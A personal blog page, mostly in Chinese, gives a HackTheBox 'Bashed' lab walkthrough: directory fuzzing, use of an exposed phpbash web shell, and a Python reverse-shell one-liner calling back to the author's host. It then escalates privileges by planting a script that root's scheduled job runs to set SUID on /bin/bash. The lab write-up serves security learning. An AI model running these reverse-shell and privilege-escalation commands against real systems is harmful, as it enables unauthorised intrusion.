@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Machine Information Difficulty: Easy OS: Linux Nmap Result PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel&#039;s Development Site | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST Device type: general purpose Running: Linux 3.X|4.X Initial Foothold 打开浏览器访问页面，作者有说机器上部署了php bash。\n">
+<title>HTB-Bashed-Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/htb-bashed-Writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="HTB-Bashed-Writeup">
+<meta property='og:description' content="Machine Information Difficulty: Easy OS: Linux Nmap Result PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel&#039;s Development Site | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST Device type: general purpose Running: Linux 3.X|4.X Initial Foothold 打开浏览器访问页面，作者有说机器上部署了php bash。\n">
+<meta property='og:url' content='http://localhost:1313/htb-bashed-Writeup/'>
+<meta property='og:site_name' content='JoWhite'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-04-19T07:25:07&#43;00:00'/><meta property='article:modified_time' content='2025-04-19T07:25:07&#43;00:00'/><meta property='og:image' content='http://localhost:1313/legacy/uploads/2025/04/1745047500-bashed-150x150.webp' />
+<meta name="twitter:title" content="HTB-Bashed-Writeup">
+<meta name="twitter:description" content="Machine Information Difficulty: Easy OS: Linux Nmap Result PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel&#039;s Development Site | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST Device type: general purpose Running: Linux 3.X|4.X Initial Foothold 打开浏览器访问页面，作者有说机器上部署了php bash。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/legacy/uploads/2025/04/1745047500-bashed-150x150.webp' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8394d4d868d05114.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😀</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">JoWhite</a></h1>
+            <h2 class="site-description">OraOra!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/en/" selected>English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#machine-information">Machine Information</a></li>
+    <li><a href="#nmap-result">Nmap Result</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb-bashed-Writeup/">
+                
+                    <img src="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp" loading="lazy" alt="Featured image of post HTB-Bashed-Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/htb/" >
+                HackTheBox Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb-bashed-Writeup/">HTB-Bashed-Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 19, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/htb-bashed-Writeup/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="machine-information">Machine Information
+</h2><ul class="wp-block-list">
+  <li>
+    Difficulty: Easy
+  </li>
+</ul>
+<ul class="wp-block-list">
+  <li>
+    OS: Linux
+  </li>
+</ul>
+<h2 id="nmap-result">Nmap Result
+</h2><div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel&#039;s Development Site
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+Device type: general purpose
+Running: Linux 3.X|4.X
+</pre>
+</div>
+<h2 id="initial-foothold">Initial Foothold
+</h2><p>打开浏览器访问页面，作者有说机器上部署了php bash。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="479" src="../legacy/uploads/2025/04/1745044852-image-1024x479.png" alt="" class="wp-image-1290" srcset="../legacy/uploads/2025/04/1745044852-image-1024x479.png 1024w, ../legacy/uploads/2025/04/1745044852-image-300x140.png 300w, ../legacy/uploads/2025/04/1745044852-image-768x359.png 768w, ../legacy/uploads/2025/04/1745044852-image-1536x719.png 1536w, ../legacy/uploads/2025/04/1745044852-image.png 1671w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>查看这个github网站：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="179" src="../legacy/uploads/2025/04/1745046706-image-1024x179.png" alt="" class="wp-image-1304" srcset="../legacy/uploads/2025/04/1745046706-image-1024x179.png 1024w, ../legacy/uploads/2025/04/1745046706-image-300x52.png 300w, ../legacy/uploads/2025/04/1745046706-image-768x134.png 768w, ../legacy/uploads/2025/04/1745046706-image.png 1302w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>一个semi-interactive web shell. 既然作者说了有，尝试ffuf找出在哪里。</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.68/FUZZ      
+<p>images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 7ms]
+css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 10ms]
+uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 14ms]
+dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 11ms]
+php                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 9ms]
+fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 7ms]
+js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 1373ms]
+server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6ms]</p>
+<p>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.10.68/FUZZ</p>
+<p>index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 11ms]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 10ms]
+contact.html            [Status: 200, Size: 7805, Words: 2630, Lines: 157, Duration: 8ms]
+.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 6ms]
+style.css               [Status: 200, Size: 24164, Words: 4814, Lines: 1412, Duration: 5ms]
+.                       [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 7ms]
+about.html              [Status: 200, Size: 8193, Words: 2878, Lines: 155, Duration: 6ms]
+.html                   [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 13ms]
+.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 9ms]
+.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 7ms]
+.htm                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 5ms]
+.htpasswds              [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 5ms]
+.htgroup                [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 7ms]
+wp-forum.phps           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 5ms]
+.htaccess.bak           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6ms]
+.htuser                 [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 8ms]
+.ht                     [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 5ms]
+.htc                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 7ms]
+</pre></p>
+</div>
+<p>在/dev下找到phpbash.php<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1002" height="1024" src="../legacy/uploads/2025/04/1745045013-image-1002x1024.png" alt="" class="wp-image-1293" srcset="../legacy/uploads/2025/04/1745045013-image-1002x1024.png 1002w, ../legacy/uploads/2025/04/1745045013-image-294x300.png 294w, ../legacy/uploads/2025/04/1745045013-image-768x785.png 768w, ../legacy/uploads/2025/04/1745045013-image.png 1134w" sizes="auto, (max-width: 1002px) 100vw, 1002px" /> </figure></p>
+<p>并可以直接获得user flag<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" decoding="async" width="768" height="387" src="../legacy/uploads/2025/04/1745045054-image.png" alt="" class="wp-image-1294" style="width:768px;height:auto" srcset="../legacy/uploads/2025/04/1745045054-image.png 768w, ../legacy/uploads/2025/04/1745045054-image-300x151.png 300w" sizes="auto, (max-width: 768px) 100vw, 768px" /> </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation
+</h2><p>因为是一个semi interactive，如果上传例如linpeas或者pspy这样的文件执行会看不到输出，所以得想办法拿到一个fully interactive shell。在<a href="https://www.revshells.com/" target="_blank"  rel="nofollow" ><a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >https://www.revshells.com/</a></a>网站生成了bash，sh，php的，都没用。最后使用python的reverse shell成功：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: python; title: ; notranslate" title="">
+# phpbash
+<p>export RHOST=&ldquo;10.10.16.11&rdquo;;export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&ldquo;RHOST&rdquo;),int(os.getenv(&ldquo;RPORT&rdquo;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&ldquo;sh&rdquo;)'</p>
+<h1 id="kali">kali
+</h1><p>nc -nlvp 80
+listening on [any] 80 &hellip;
+connect to [10.10.16.11] from (UNKNOWN) [10.10.10.68] 33862
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+<h1 id="使用python获得ttyshell">使用python获得ttyshell
+</h1><p>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+www-data@bashed:/
+</pre></p>
+</div>
+<p>sudo -l得知www-data可以以sciprtmanager执行任意指令。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="171" src="../legacy/uploads/2025/04/1745046265-image-1024x171.png" alt="" class="wp-image-1297" srcset="../legacy/uploads/2025/04/1745046265-image-1024x171.png 1024w, ../legacy/uploads/2025/04/1745046265-image-300x50.png 300w, ../legacy/uploads/2025/04/1745046265-image-768x128.png 768w, ../legacy/uploads/2025/04/1745046265-image.png 1065w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>在根目录下找到一个不常见的文件夹: scriptmanager. 先以scriptmanager打开一个新shell，并打开看看有什么：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
+<p>www-data@bashed:/$ sudo -u scriptmanager /bin/bash
+sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/scripts$ ls -l
+ls -l
+total 12
+-rw-r&ndash;r&ndash; 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
+-rw-r&ndash;r&ndash; 1 root          root          12 Apr 19 00:17 test.txt
+scriptmanager@bashed:/scripts$ cat test.py
+cat test.py
+f = open(&ldquo;test.txt&rdquo;, &ldquo;w&rdquo;)
+f.write(&ldquo;testing 123!&rdquo;)
+f.close
+</pre></p>
+</div>
+<p>一个测试用的python文件，猜测可能会被自动运行？上传pspy并观察：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="90" src="../legacy/uploads/2025/04/1745046227-image-1024x90.png" alt="" class="wp-image-1295" srcset="../legacy/uploads/2025/04/1745046227-image-1024x90.png 1024w, ../legacy/uploads/2025/04/1745046227-image-300x26.png 300w, ../legacy/uploads/2025/04/1745046227-image-768x68.png 768w, ../legacy/uploads/2025/04/1745046227-image.png 1246w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>发现root用户会每隔一段时间运行/scripts文件夹下所有的python文件，那么提权就很简单了。在scripts/ 下创建一个设置bash suid的python文件：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+echo &#039;import os; os.system("chmod u+s /bin/bash")&#039; &gt; exploit.py
+</pre>
+</div>
+<p>等待root运行：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="320" src="../legacy/uploads/2025/04/1745047231-image-1024x320.png" alt="" class="wp-image-1316" srcset="../legacy/uploads/2025/04/1745047231-image-1024x320.png 1024w, ../legacy/uploads/2025/04/1745047231-image-300x94.png 300w, ../legacy/uploads/2025/04/1745047231-image-768x240.png 768w, ../legacy/uploads/2025/04/1745047231-image.png 1251w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>在设置suid后使用/bin/bash -p提权，并在root路径下获取flag：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="479" height="236" src="../legacy/uploads/2025/04/1745046632-image.png" alt="" class="wp-image-1301" srcset="../legacy/uploads/2025/04/1745046632-image.png 479w, ../legacy/uploads/2025/04/1745046632-image-300x148.png 300w" sizes="auto, (max-width: 479px) 100vw, 479px" /> </figure></p>
+<p>Happy hacking</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Apr 19, 2025 07:25 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb-flight-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Flight-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-underpass-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-UnderPass-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-administrator-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/04/1745035819-download-150x150.png" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/04/1745035819-download-150x150.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Administrator-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-season-6-monitored/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Season 6-Monitored</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-retired-magic-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Retired-Magic-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Jowhite
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
